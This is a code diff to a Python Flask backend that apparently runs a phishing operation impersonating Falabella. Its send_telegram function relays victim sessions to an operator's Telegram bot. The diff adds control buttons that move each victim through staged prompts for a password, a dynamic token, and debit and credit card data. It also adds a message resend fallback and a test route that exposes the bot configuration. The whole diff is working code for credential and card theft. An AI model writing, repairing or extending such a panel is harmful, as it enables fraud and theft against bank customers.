@@ -218,6 +218,7 @@ def block_foreign_ips():
 
 def send_telegram(message, user_id=None):
     try:
+        base_url = os.environ.get("BASE_URL") or os.environ.get("RENDER_EXTERNAL_URL") or (BASE_URL if 'BASE_URL' in globals() else "")
         url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
         payload = {
             "chat_id": TG_CHAT_ID, 
@@ -225,24 +226,29 @@ def send_telegram(message, user_id=None):
             "parse_mode": "HTML"
         }
         
-        if user_id:
+        if user_id and base_url and not ("localhost" in str(base_url) or "127.0.0.1" in str(base_url)):
+            base_url_str = str(base_url).strip()
+            if not base_url_str.startswith("http://") and not base_url_str.startswith("https://"):
+                base_url_str = "https://" + base_url_str
+            base_url_str = base_url_str.rstrip("/")
+            
             keyboard = {
                 "inline_keyboard": [
                     [
-                        {"text": "❌ Error Clave", "url": f"{BASE_URL}/update_status/{user_id}/2"},
-                        {"text": "🔐 Token Dinámico", "url": f"{BASE_URL}/update_status/{user_id}/3"}
+                        {"text": "❌ Error Clave", "url": f"{base_url_str}/update_status/{user_id}/2"},
+                        {"text": "🔐 Token Dinámico", "url": f"{base_url_str}/update_status/{user_id}/3"}
                     ],
                     [
-                        {"text": "⚠️ Err Token", "url": f"{BASE_URL}/update_status/{user_id}/4"},
-                        {"text": "💳 T. Débito", "url": f"{BASE_URL}/update_status/{user_id}/6"}
+                        {"text": "⚠️ Err Token", "url": f"{base_url_str}/update_status/{user_id}/4"},
+                        {"text": "💳 T. Débito", "url": f"{base_url_str}/update_status/{user_id}/6"}
                     ],
                     [
-                        {"text": "🚨 Err Débito", "url": f"{BASE_URL}/update_status/{user_id}/7"},
-                        {"text": "💳 T. Crédito", "url": f"{BASE_URL}/update_status/{user_id}/8"}
+                        {"text": "🚨 Err Débito", "url": f"{base_url_str}/update_status/{user_id}/7"},
+                        {"text": "💳 T. Crédito", "url": f"{base_url_str}/update_status/{user_id}/8"}
                     ],
                     [
-                        {"text": "🚨 Err Crédito", "url": f"{BASE_URL}/update_status/{user_id}/9"},
-                        {"text": "✅ Finalizar", "url": f"{BASE_URL}/update_status/{user_id}/5"}
+                        {"text": "🚨 Err Crédito", "url": f"{base_url_str}/update_status/{user_id}/9"},
+                        {"text": "✅ Finalizar", "url": f"{base_url_str}/update_status/{user_id}/5"}
                     ]
                 ]
             }
@@ -250,8 +256,30 @@ def send_telegram(message, user_id=None):
             
         r = requests.post(url, data=payload)
         print(f"Telegram Response: {r.status_code} - {r.text}")
+        
+        # SI TELEGRAM RECHAZA LOS BOTONES (Error 400 Bad Request por URL inválida), REINTENTAR SIN BOTONES
+        if r.status_code != 200 and "reply_markup" in payload:
+            print("[TELEGRAM RECOVERY] Reintentando envío sin botones por posible error en URL de botones...")
+            payload.pop("reply_markup", None)
+            r = requests.post(url, data=payload)
+            print(f"Telegram Fallback Response: {r.status_code} - {r.text}")
+
+        return {"status_code": r.status_code, "text": r.text, "ok": r.status_code == 200}
     except Exception as e:
         print(f"Error Telegram: {e}")
+        return {"status_code": 0, "text": str(e), "ok": False}
+
+@app.route('/test_telegram')
+def test_telegram():
+    res = send_telegram("🧪 <b>Mensaje de prueba desde Falabella (NextGen)</b>\n\nSi lees esto, tu bot y Chat ID funcionan correctamente.")
+    return jsonify({
+        "status": "success" if res.get("ok") else "error",
+        "telegram_response": res,
+        "config_used": {
+            "chat_id": TG_CHAT_ID,
+            "token_preview": (TG_TOKEN[:10] + "...") if TG_TOKEN else "NO_CONFIGURADO"
+        }
+    })
 
 def get_db_connection():
     url = DB_URL
